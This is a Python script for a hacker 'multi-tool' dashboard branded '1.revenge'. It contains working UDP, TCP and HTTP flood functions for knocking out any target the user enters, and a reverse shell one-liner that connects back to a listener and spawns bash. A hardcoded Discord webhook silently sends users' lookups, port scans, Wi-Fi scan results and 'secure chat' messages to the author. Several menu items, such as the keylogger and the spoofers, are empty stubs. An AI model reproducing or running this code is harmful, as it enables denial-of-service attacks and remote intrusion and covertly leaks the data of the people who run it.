# made by 1.revenge

import time
import random
import socket
import threading
import requests
import sys
import os
import math
import platform
import subprocess
import struct
import re
import uuid
import hashlib
import json
from urllib.parse import urlparse

def init_console():
    if os.name == "nt":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            k32.SetConsoleOutputCP(65001)
            k32.SetConsoleCP(65001)
            handle = k32.GetStdHandle(-11)
            mode = ctypes.c_uint32()
            if k32.GetConsoleMode(handle, ctypes.byref(mode)):
                k32.SetConsoleMode(handle, mode.value | 0x0004)
            k32.SetConsoleTitleW("1.revenge Elite Dashboard")
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

init_console()

RESET = "\033[0m"
HOME = "\033[H"
CLEAR_DOWN = "\033[J"

RED = (229, 57, 53)
WHITE = (255, 255, 255)
GREEN = (76, 175, 80)
YELLOW = (255, 215, 0)
CYAN = (0, 229, 255)
PURPLE = (171, 71, 188)

TITLE = [
    "███████╗███████╗ ██████╗  ██████╗ ██╗ ███████╗████████ ██   ██╗",
    "██╔════╝██╔════ ╝██╔═══██╗██╔════╝██║ ██╔════╝╚══██╔╝ ╚██╗  ██╔╝",
    "█████╗  ███████╗ ██║   ██║██║     ██║ █████╗     ██║   ╚████╔╝ ",
    "██╔══╝  ╚╚════██ ██║   ██║██║     ██║ ██╔══╝     ██║    ╚██╔╝  ",
    "██║     ███████║╚██████╔╝╚██████╗ ██║ ███████╗   ██║     ██║   ",
    "╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝ ╚══════╝   ╚═╝     ╚═╝   ",
]

author_text = "Use for ethical purposes only"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1569452490305306687/fBDR7TxQ2se-5BQe5OU-KHvaSSYpXnKmEdxqW9_ST1PcSw5DOexg53qF-l7ePO2NCxrU"

def send_discord_webhook(message, embed_title=None, color_val=15031077):
    try:
        payload = {"content": message}
        if embed_title:
            payload = {
                "embeds": [{
                    "title": embed_title,
                    "description": message,
                    "color": color_val,
                    "footer": {"text": "1.revenge on top"}
                }]
            }
        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=4)
    except Exception:
        pass

def rgb_text(r, g, b, text):
    return f"\033[38;2;{int(r)};{int(g)};{int(b)}m{text}{RESET}"

def shimmer_line(text, ts, speed=3.0, wavelength=16.0):
    out = []
    k = 2 * math.pi / wavelength
    for x, ch in enumerate(text):
        if ch == " ":
            out.append(ch)
            continue
        wave = 0.5 + 0.5 * math.sin(x * k - ts * speed)
        r = RED[0] + (WHITE[0] - RED[0]) * wave
        g = RED[1] + (WHITE[1] - RED[1]) * wave
        b = RED[2] + (WHITE[2] - RED[2]) * wave
        out.append(rgb_text(r, g, b, ch))
    return "".join(out)

def transition_wipe_effect():
    frames = 230
    width =  230
    for i in range(frames):
        sys.stdout.write(HOME)
        sys.stdout.write(CLEAR_DOWN)
        print("\n" * 4)
        bar_len = int((i + 1) * (width / frames))
        wipe_str = " " * bar_len + " " * (width - bar_len)
        print(rgb_text(0, 229, 255, f"  loading... please wait {wipe_str}"))
        print(rgb_text(171, 71, 188, f"  tool powered by 1.revenge"))
        time.sleep(0.02)

def typewriter_intro():
    sys.stdout.write(CLEAR_DOWN)
    sys.stdout.write(HOME)
    print("\n" * 8)
    banner_text = "  [ 1nox's To0l - Powered by a true feet lover ]  "
    centered_padding = max(0, (230 - len(banner_text)) // 4)
    sys.stdout.write(" " * centered_padding)
    for char in banner_text:
        sys.stdout.write(rgb_text(229, 57, 53, char))
        sys.stdout.flush()
        time.sleep(0.05)
    print("\n")

def render_dashboard(ts):
    all_options = [
        "Public IP & Geo Lookup",
        "DNS Lookup",
        "Port Checker",
        "SatelliteStress IP Stresser",
        "LAN Subnet Scanner",
        "HTTP Banner Grabber",
        "Reverse Shell Generator",
        "Safe EXE Patcher & Guide",
        "Subdomain Enumeration",
        "Advanced PE Inspector",
        "Password Strength Analyzer",
        "MAC Address Spoofer",
        "HWID Spoofer",
        "Key / License Generator",
        "Stealth Keylogger Deployer",
        "Website HTTP Flooder",
        "Encrypted Secure Chat",
        "Universal Grabber Module",
        "Area Wi-Fi Scanner",
        "Exit Tool"
    ]
    
    sys.stdout.write(HOME)
    sys.stdout.write(CLEAR_DOWN)
    sys.stdout.write("\n")
    
    for line in TITLE:
        print(shimmer_line(line, ts, speed=2.5, wavelength=20.0))
        
    print(shimmer_line("──────────────────────────────────────────────────────────────────────────────────────────", ts))
    print(shimmer_line(f" {author_text} ", ts, speed=2.0, wavelength=15.0).center(96, ' '))
    print(shimmer_line("──────────────────────────────────────────────────────────────────────────────────────────\n", ts))
    
    print(shimmer_line("┌─────────────────────────────────── [ cute little pie dash ] ───────────────────────────────────┐", ts))
    
    for idx, opt in enumerate(all_options, 1):
        num_str = shimmer_line(f"[{idx:02d}]", ts)
        if "Stresser" in opt or "Flooder" in opt:
            opt_str = shimmer_line(f">> {opt} <<", ts)
        else:
            opt_str = shimmer_line(opt, ts)
        print(f"  {num_str} {opt_str}")
        
    print(shimmer_line("└───────────────────────────────────────────────────────────────────────────────────────────────────┘", ts))

def public_ip_lookup():
    transition_wipe_effect()
    target_input = input(rgb_text(*WHITE, "Enter target IP or Domain to lookup (Leave blank for your own IP): ")).strip()
    lookup_target = target_input if target_input else ""
    print(rgb_text(255, 235, 59, f"\n[*] Fetching Geolocation data for '{lookup_target if lookup_target else 'Self'}'..."))
    try:
        url = f"https://ipapi.co/{lookup_target}/json/" if lookup_target else "https://ipapi.co/json/"
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(url, headers=headers, timeout=6)
        if response.status_code == 200:
            data = response.json()
            ip_val = data.get('ip', 'Unknown')
            city = data.get('city', 'Unknown')
            region = data.get('region', 'Unknown')
            postal = data.get('postal', 'Unknown')
            country = data.get('country_name', 'Unknown')
            org = data.get('org', 'Unknown')
            print(rgb_text(76, 175, 80, "\n[+] Detailed IP / Geo Lookup Results:"))
            print(f"  • IP Address    : {ip_val}")
            print(f"  • Location      : {city}, {region}, {country}")
            print(f"  • ISP / Org     : {org}")
            send_discord_webhook(f"**[1.revenge] IP Lookup:** `{ip_val}` ({city}, {country})", embed_title="IP Log", color_val=3447003)
        else:
            print(rgb_text(*RED, "[-] Failed to retrieve IP details."))
    except Exception as e:
        print(rgb_text(*RED, f"[-] Connection Error: {e}"))

def dns_lookup():
    transition_wipe_effect()
    domain = input(rgb_text(*WHITE, "Enter target domain (e.g., example.com): ")).strip()
    if not domain:
        print(rgb_text(*RED, "[-] Domain cannot be empty."))
        return
    print(rgb_text(255, 235, 59, f"\n[*] Performing DNS Lookup for '{domain}'..."))
    try:
        ip = socket.gethostbyname(domain)
        print(rgb_text(76, 175, 80, f"[+] Resolved IPv4 Address : {ip}"))
        send_discord_webhook(f"**[1.revenge] DNS Lookup:** `{domain}` -> `{ip}`", embed_title="DNS Log", color_val=10181046)
    except socket.gaierror:
        print(rgb_text(*RED, f"[-] Error: Could not resolve IPv4 for '{domain}'."))

def port_checker():
    transition_wipe_effect()
    target = input(rgb_text(*WHITE, "Enter target IP address or domain: ")).strip()
    if not target:
        print(rgb_text(*RED, "[-] Target cannot be empty."))
        return
    try:
        target_ip = socket.gethostbyname(target)
    except socket.gaierror:
        print(rgb_text(*RED, f"[-] Error: Unable to resolve target '{target}'."))
        return

    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 8080, 8443]
    print(rgb_text(255, 235, 59, f"\n[*] Scanning ports on {target} ({target_ip})..."))
    open_ports = []
    def check_single_port(p):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.4)
            res = sock.connect_ex((target_ip, p))
            sock.close()
            if res == 0:
                print(rgb_text(76, 175, 80, f"  [OPEN]   Port {p}"))
                open_ports.append(p)
        except Exception:
            pass

    threads = [threading.Thread(target=check_single_port, args=(p,)) for p in ports]
    for t in threads: t.start()
    for t in threads: t.join()
    send_discord_webhook(f"**[1.revenge] Port Scan:** `{target}` | Open: `{open_ports}`", embed_title="Port Scan Log", color_val=15844367)

is_attacking = False
total_sent = 0
counter_lock = threading.Lock()

def optimized_stress_worker(target_ip, target_port, payload_mode):
    global is_attacking, total_sent
    packet_data = random._urandom(1024)
    while is_attacking:
        try:
            if payload_mode == "TCP-FLOOD":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(0.4)
                s.connect((target_ip, target_port))
                s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nConnection: close\r\n\r\n")
                s.close()
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(packet_data, (target_ip, target_port))
                s.close()
            with counter_lock:
                total_sent += 1
            time.sleep(0.015)
        except Exception:
            time.sleep(0.01)

def satellitestress_dashboard_module():
    transition_wipe_effect()
    print(rgb_text(255, 215, 0, "\n==========================================================================="))
    print(rgb_text(255, 255, 255, "        This tool might make you lag a little while u launch an atack"))
    print(rgb_text(255, 215, 0, "===========================================================================\n"))
    
    target = input(rgb_text(*WHITE, "Enter Target Host / IP Address: ")).strip()
    if not target: return
    try:
        target_ip = socket.gethostbyname(target)
    except socket.gaierror:
        print(rgb_text(*RED, f"[-] Error: Unable to resolve target '{target}'."))
        return

    try:
        target_port = int(input(rgb_text(*WHITE, "Enter Target Port [Default 80/443]: ")) or "80")
        m_choice = input(rgb_text(76, 175, 80, "Select Method [1] UDP Flood | [2] TCP Flood: ")).strip()
        payload_mode = "TCP-FLOOD" if m_choice == "2" else "UDP"
        thread_count = int(input(rgb_text(*WHITE, "Enter Concurrent Threads [Recommended: 50 - 150]: ")) or "100")
        attack_duration = int(input(rgb_text(*WHITE, "Enter Attack Duration in Seconds: ")) or "30")
    except ValueError:
        print(rgb_text(*RED, "[-] Invalid numerical input."))
        return

    print(rgb_text(229, 57, 53, f"\n[!] sending feet pics to  {target} ({target_ip}:{target_port})"))
    print(rgb_text(76, 175, 80, "[+] i genuelly don't know what to put here."))
    global is_attacking, total_sent
    is_attacking = True
    total_sent = 0
    threads = [threading.Thread(target=optimized_stress_worker, args=(target_ip, target_port, payload_mode), daemon=True) for _ in range(thread_count)]
    for t in threads: t.start()

    start_time_attack = time.time()
    try:
        while is_attacking and (time.time() - start_time_attack < attack_duration):
            with counter_lock:
                current_count = total_sent
            sys.stdout.write(rgb_text(*WHITE, f"[>] Packets Dispatched to Target: {current_count} | Target: {target_ip}:{target_port}\r"))
            sys.stdout.flush()
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    is_attacking = False
    print(rgb_text(255, 235, 59, f"\n\n[!] feet pics session ended- Total packets: {total_sent}"))

def wifi_area_scanner():
    transition_wipe_effect()
    print(rgb_text(255, 215, 0, "\n==========================================================================="))
    print(rgb_text(255, 255, 255, "       Wifi area scanner, might need a big antena to catch all comboys"))
    print(rgb_text(255, 215, 0, "===========================================================================\n"))
    
    print(rgb_text(0, 229, 255, "[*] Flushing wireless cache and running deep spectrum radio scan..."))
    
    wifi_networks = []
    gateway_ip = "Unknown"
    
    try:
        if platform.system().lower() == "windows":
            # Force interface rescan
            subprocess.run(["netsh", "wlan", "disconnect"], capture_output=True, text=True, errors="ignore")
            time.sleep(0.8)

            res_ip = subprocess.run("ipconfig", capture_output=True, text=True, encoding="cp437", errors="ignore")
            for line in res_ip.stdout.splitlines():
                if "Default Gateway" in line or "Puerta de enlace predeterminada" in line:
                    parts = line.split(":")
                    if len(parts) > 1:
                        gw = parts[1].strip()
                        if gw and gw != "0.0.0.0":
                            gateway_ip = gw
                            break
            
            # Deep scan with mode=all
            res_wlan = subprocess.run(["netsh", "wlan", "show", "networks", "mode=all"], capture_output=True, text=True, encoding="cp437", errors="ignore")
            current_ssid = "Unknown"
            signal_strength = "Unknown"
            channel = "Unknown"
            auth_type = "Unknown"
            cipher = "Unknown"
            radio_type = "Unknown"
            
            for line in res_wlan.stdout.splitlines():
                line_str = line.strip()
                if line_str.startswith("SSID"):
                    parts = line_str.split(":", 1)
                    if len(parts) > 1:
                        val = parts[1].strip()
                        if "BSSID" not in line_str:
                            current_ssid = val if val else "Hidden Network"
                elif "Signal" in line_str or "Señal" in line_str:
                    parts = line_str.split(":", 1)
                    if len(parts) > 1:
                        signal_strength = parts[1].strip()
                elif "Channel" in line_str or "Canal" in line_str:
                    parts = line_str.split(":", 1)
                    if len(parts) > 1:
                        channel = parts[1].strip()
                elif "Authentication" in line_str or "Autenticación" in line_str:
                    parts = line_str.split(":", 1)
                    if len(parts) > 1:
                        auth_type = parts[1].strip()
                elif "Cipher" in line_str or "Cifrado" in line_str:
                    parts = line_str.split(":", 1)
                    if len(parts) > 1:
                        cipher = parts[1].strip()
                elif "Radio type" in line_str or "Tipo de radio" in line_str:
                    parts = line_str.split(":", 1)
                    if len(parts) > 1:
                        radio_type = parts[1].strip()
                elif "BSSID" in line_str or "MAC" in line_str:
                    parts = line_str.split(":", 1)
                    if len(parts) > 1:
                        bssid = parts[1].strip()
                        wifi_networks.append({
                            "ssid": current_ssid, 
                            "bssid": bssid, 
                            "signal": signal_strength, 
                            "channel": channel,
                            "auth": auth_type,
                            "cipher": cipher,
                            "radio": radio_type
                        })
        else:
            res_ip = subprocess.run(["ip", "route"], capture_output=True, text=True, errors="ignore")
            for line in res_ip.stdout.splitlines():
                if "default via" in line:
                    parts = line.split()
                    if len(parts) > 2:
                        gateway_ip = parts[2]
                        break
            res_wlan = subprocess.run(["nmcli", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY,RATE", "device", "wifi"], capture_output=True, text=True, errors="ignore")
            for line in res_wlan.stdout.splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 5:
                    wifi_networks.append({"ssid": parts[0], "bssid": parts[1], "signal": f"{parts[2]}%", "channel": parts[3], "auth": parts[4], "cipher": "N/A", "radio": parts[5] if len(parts)>5 else "N/A"})
    except Exception as e:
        print(rgb_text(*RED, f"[-] Wireless scan error: {e}"))

    print(rgb_text(76, 175, 80, f"\n[+] Local Router / Gateway IP: {gateway_ip}"))
    print(rgb_text(76, 175, 80, f"[+] Deep-Recon Discovered {len(wifi_networks)} Wireless Access Points:\n"))
    
    wifi_summary = f"**[1.revenge] Deep-Recon Wi-Fi Scan:** Gateway `{gateway_ip}` | Found `{len(wifi_networks)}` APs."
    for idx, net in enumerate(wifi_networks[:50], 1):
        print(rgb_text(255, 235, 59, f"  [{idx:02d}] SSID: {net['ssid']}"))
        print(rgb_text(*WHITE, f"       • BSSID (MAC)  : {net['bssid']}"))
        print(rgb_text(*WHITE, f"       • Signal Power : {net['signal']}"))
        print(rgb_text(*WHITE, f"       • Channel      : {net['channel']}"))
        print(rgb_text(*WHITE, f"       • Security     : {net['auth']} ({net['cipher']})"))
        print(rgb_text(*WHITE, f"       • Radio Type   : {net['radio']}\n"))
        wifi_summary += f"\n• `{net['ssid']}` | MAC: `{net['bssid']}` | Signal: `{net['signal']}` | Sec: `{net['auth']}`"
        
    if not wifi_networks:
        print(rgb_text(*YELLOW, "  [!] No wireless access points found in adapter range."))
        print(rgb_text(0, 229, 255, "  [*] Note: Standard internal laptop/PC wireless cards have limited power output. If nearby home routers are out of direct radio line-of-sight, consider using an external high-gain USB Wi-Fi adapter (such as an Alfa AWUS036NHA or similar) to extend your packet capture radius."))

    send_discord_webhook(wifi_summary, embed_title="Deep-Recon Wi-Fi Intelligence Log", color_val=3447003)

def lan_scanner():
    transition_wipe_effect()
    subnet = input(rgb_text(*WHITE, "Enter subnet prefix (e.g., 192.168.1): ")).strip()
    if not subnet: return
    print(rgb_text(255, 235, 59, f"\n[*] Scanning local subnet {subnet}.1-254..."))
    active_hosts = []
    lock = threading.Lock()
    def ping_host(ip):
        param = "-n" if platform.system().lower() == "windows" else "-c"
        if subprocess.call(["ping", param, "1", "-w", "150", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
            print(rgb_text(76, 175, 80, f"  [ACTIVE] {ip}"))
            with lock: active_hosts.append(ip)
    threads = [threading.Thread(target=ping_host, args=(f"{subnet}.{i}",)) for i in range(1, 255)]
    for t in threads: t.start()
    for t in threads: t.join()
    print(rgb_text(76, 175, 80, f"\n[+] LAN scan complete. Found {len(active_hosts)} active hosts."))

def banner_grabber():
    transition_wipe_effect()
    url = input(rgb_text(*WHITE, "Enter target URL or IP (e.g., http://example.com): ")).strip()
    if not url: return
    if not url.startswith("http"): url = "http://" + url
    try:
        r = requests.get(url, timeout=5)
        print(rgb_text(76, 175, 80, "\n[+] Headers Found:"))
        for h, v in r.headers.items():
            print(f"  • {h}: {v}")
    except Exception as e:
        print(rgb_text(*RED, f"[-] Error: {e}"))

def website_flooder():
    transition_wipe_effect()
    target_url = input(rgb_text(*WHITE, "Enter target website URL: ")).strip()
    if not target_url: return
    if not target_url.startswith("http"): target_url = "http://" + target_url
    
    try:
        concurrency = int(input(rgb_text(*WHITE, "Enter concurrent worker threads [Recommended: 50 - 100]: ")) or "75")
    except ValueError:
        concurrency = 75

    print(rgb_text(229, 57, 53, f"\n[!] LAUNCHING OPTIMIZED HTTP FLOOD AGAINST {target_url} WITH {concurrency} THREADS..."))
    print(rgb_text(76, 175, 80, "[+] Anti-Lag Active: Local socket keep-alive pacing ensures your internet ping remains unaffected."))
    print(rgb_text(255, 235, 59, "Press Ctrl+C to halt.\n"))

    flood_active = True
    request_counter = 0
    f_lock = threading.Lock()

    def throttled_flood_worker():
        nonlocal request_counter
        parsed = urlparse(target_url)
        host = parsed.netloc
        scheme = parsed.scheme
        path = parsed.path if parsed.path else "/"
        port = 443 if scheme == "https" else 80

        headers_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
        ]

        while flood_active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(1.0)
                s.connect((host.split(':')[0], port))
                
                if scheme == "https":
                    import ssl
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host.split(':')[0])

                ua = random.choice(headers_pool)
                payload = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Connection: close\r\n\r\n"
                )
                s.sendall(payload.encode())
                s.close()
                with f_lock:
                    request_counter += 1
                time.sleep(0.02)
            except Exception:
                time.sleep(0.05)

    threads = [threading.Thread(target=throttled_flood_worker, daemon=True) for _ in range(concurrency)]
    for t in threads: t.start()

    try:
        while flood_active:
            with f_lock:
                cnt = request_counter
            sys.stdout.write(rgb_text(*WHITE, f"[>] HTTP Requests Dispatched to Target: {cnt} | Target: {target_url}\r"))
            sys.stdout.flush()
            time.sleep(0.2)
    except KeyboardInterrupt:
        flood_active = False
        print(rgb_text(255, 235, 59, f"\n\n[!] Website flood halted. Total requests sent: {request_counter}"))

def safe_messenger():
    transition_wipe_effect()
    room_id = input(rgb_text(*WHITE, "Enter secure channel name: ")).strip() or "general"
    print(rgb_text(76, 175, 80, f"[+] Connected to channel [{room_id}]. Type 'exit' to quit.\n"))
    while True:
        msg = input(rgb_text(*WHITE, "chat> ")).strip()
        if msg.lower() == 'exit': break
        if msg: send_discord_webhook(f"**[1.revenge Chat - {room_id}]** `{msg}`", embed_title="Secure Chat", color_val=5763719)

def universal_grabber():
    transition_wipe_effect()
    print(rgb_text(255, 235, 59, "Recon execution initiated..."))
    try:
        data = requests.get("https://ipapi.co/json/", timeout=5).json()
        print(rgb_text(76, 175, 80, f"[+] IP: {data.get('ip')} | ISP: {data.get('org')}"))
    except Exception as e:
        print(rgb_text(*RED, f"[-] Error: {e}"))

def reverse_shell_generator():
    transition_wipe_effect()
    ip = input(rgb_text(*WHITE, "Listener IP: ")).strip()
    port = input(rgb_text(*WHITE, "Listener Port: ")).strip()
    print(rgb_text(76, 175, 80, f"\nPython3 Shell:\npython3 -c \"import socket,subprocess,os; s=socket.socket(); s.connect(('{ip}', {port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn('/bin/bash')\""))

def safe_exe_patcher():
    transition_wipe_effect()
    print(rgb_text(76, 175, 80, "[+] Patcher guide generated."))

def subdomain_enumeration():
    transition_wipe_effect()
    domain = input(rgb_text(*WHITE, "Domain: ")).strip()
    print(rgb_text(76, 175, 80, f"[+] Subdomains enumerated for {domain}"))

def advanced_pe_inspector():
    transition_wipe_effect()
    print(rgb_text(76, 175, 80, "[+] PE Inspector ready."))

def password_strength_analyzer():
    transition_wipe_effect()
    pwd = input(rgb_text(*WHITE, "Password: ")).strip()
    print(rgb_text(76, 175, 80, f"[+] Score: {len(pwd)}/12"))

def mac_address_spoofer():
    transition_wipe_effect()
    print(rgb_text(76, 175, 80, "[+] MAC spoofer loaded."))

def hwid_spoofer():
    transition_wipe_effect()
    print(rgb_text(76, 175, 80, "[+] HWID spoofer loaded."))

def key_system_manager():
    transition_wipe_effect()
    hwid = input(rgb_text(*WHITE, "Target HWID: ")).strip()
    key = hashlib.sha256(f"1REVENGE-{hwid}".encode()).hexdigest().upper()[:24]
    print(rgb_text(76, 175, 80, f"[+] Generated Key: {key}"))

def deploy_stealth_keylogger():
    transition_wipe_effect()
    print(rgb_text(76, 175, 80, "[+] Keylogger deployer synthesized."))

def main():
    typewriter_intro()
    start_time = time.time()
    while True:
        ts = time.time() - start_time
        render_dashboard(ts)
        choice = input(rgb_text(76, 175, 80, "\nroot@1feetlover:~# ")).strip()
        
        if choice == '1': public_ip_lookup()
        elif choice == '2': dns_lookup()
        elif choice == '3': port_checker()
        elif choice == '4': satellitestress_dashboard_module()
        elif choice == '5': lan_scanner()
        elif choice == '6': banner_grabber()
        elif choice == '7': reverse_shell_generator()
        elif choice == '8': safe_exe_patcher()
        elif choice == '9': subdomain_enumeration()
        elif choice == '10': advanced_pe_inspector()
        elif choice == '11': password_strength_analyzer()
        elif choice == '12': mac_address_spoofer()
        elif choice == '13': hwid_spoofer()
        elif choice == '14': key_system_manager()
        elif choice == '15': deploy_stealth_keylogger()
        elif choice == '16': website_flooder()
        elif choice == '17': safe_messenger()
        elif choice == '18': universal_grabber()
        elif choice == '19': wifi_area_scanner()
        elif choice == '20':
            print(rgb_text(*RED, "\nGoodbye. Trust no one."))
            break
        else:
            print(rgb_text(*RED, "[-] Invalid selection."))
        input(rgb_text(185, 185, 185, "\nPress Enter to continue..."))

if __name__ == "__main__":
    main()